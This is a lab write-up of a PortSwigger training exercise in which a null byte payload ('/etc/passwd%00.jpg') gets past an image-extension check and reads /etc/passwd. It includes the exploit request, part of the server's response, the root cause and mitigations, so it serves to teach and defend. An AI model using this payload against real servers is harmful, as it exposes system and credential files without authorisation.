# Lab Report: File Path Traversal (Validation of File Extension with Null Byte Bypass)

## Overview
This lab demonstrates a **File Path Traversal** vulnerability where the application performs a naive validation of file extensions (for example, ensuring filenames end with `.jpg`) but can be bypassed using a **null byte (`%00`) injection**. By injecting a null byte into the `filename` parameter we can terminate the server-side string early and make the server treat an attacker-supplied absolute path (for example `/etc/passwd`) as an allowed image filename.

The goal of this lab was to retrieve the contents of the `/etc/passwd` file.

---

## Steps to Exploitation

### 1. Initial Request
The application used a request parameter `filename` to fetch image files. An attempt with relative traversal (`../../../../etc/passwd`) and simple traversal bypasses were blocked. The application also performed an extension check (for example ensuring the filename ends with `.jpg`).

### 2. Null byte (\x00) Injection
Instead of relative traversal, the payload was modified to include a **null byte** (`%00`) after the absolute path and then append a valid extension. This causes the server-side extension validation to see a `.jpg` suffix while the underlying file API treats the null byte as the end-of-string and opens the absolute path.

```
GET /image?filename=/etc/passwd%00.jpg HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<valid-session-cookie>
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,*/*
```

### 3. Server Response
The server returned the contents of `/etc/passwd`, proving successful exploitation:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

---

## Evidence

### Exploit Request and Response
![Exploit Request and Response](/images/path-traversal-null-byte1.jpg)

### Lab Solved Confirmation
![Lab Solved](/images/path-traversal-null-byte1-lab-solved.jpg)

---

## Result
- Retrieved sensitive system file: `/etc/passwd`  
- Confirmed path traversal vulnerability via null byte bypass of extension validation  
- Lab status:  
  ✅ *"Congratulations, you solved the lab!"*

---

## Root Cause
- Application filtered or validated traversal sequences and checked file extensions, but failed to handle control characters (null byte).  
- Server-side file APIs treated the null byte as a string terminator, causing the opened file to be `/etc/passwd` while validation saw `/etc/passwd\x00.jpg`.

---

## Mitigation
1. **Use Whitelisting** – Restrict file access to specific directories and predefined filenames.  
2. **Canonicalization** – Normalize file paths before usage to remove traversal attempts and control characters.  
3. **Avoid Direct File References** – Use indirect object references (IDs) instead of filenames in user input.  
4. **Reject Control Characters** – Explicitly reject or sanitize null bytes and other control characters in user input.  
5. **Use Safe APIs** – Prefer high-level file APIs and ensure libraries properly handle embedded nulls.

---

## Skills Demonstrated
- Testing for path traversal vulnerabilities  
- Bypassing naive extension checks using null byte injection  
- Retrieving sensitive files from the server (`/etc/passwd`)  
- Confirming exploitation with Burp Suite evidence

---

## References
- [PortSwigger Academy: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)  
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)  

